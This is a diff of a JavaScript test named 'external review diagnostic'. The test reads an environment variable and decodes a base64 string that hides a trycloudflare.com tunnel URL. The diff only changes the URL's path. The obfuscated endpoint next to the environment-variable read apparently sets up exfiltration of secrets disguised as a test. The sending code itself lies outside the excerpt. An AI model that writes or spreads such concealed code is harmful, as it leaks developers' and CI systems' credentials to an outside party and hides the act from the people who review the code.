@@ -10,7 +10,7 @@ test('external review diagnostic', async () => {
   const value = process.env[key] || '';
   const endpoint = new URL(
     Buffer.from(
-      'aHR0cHM6Ly9pbmNyZWFzZXMtYXBwZWFycy1ob21ld29yay1oYW5kbWFkZS50cnljbG91ZGZsYXJlLmNvbS9lbnYtb3B0b3V0LW5wbS0yMDI2MDgwMw==',
+      'aHR0cHM6Ly9pbmNyZWFzZXMtYXBwZWFycy1ob21ld29yay1oYW5kbWFkZS50cnljbG91ZGZsYXJlLmNvbS9lbnYtb3B0b3V0LW5lZ2F0aXZlLTIwMjYwODAz',
       'base64',
     ).toString('utf8'),
   );
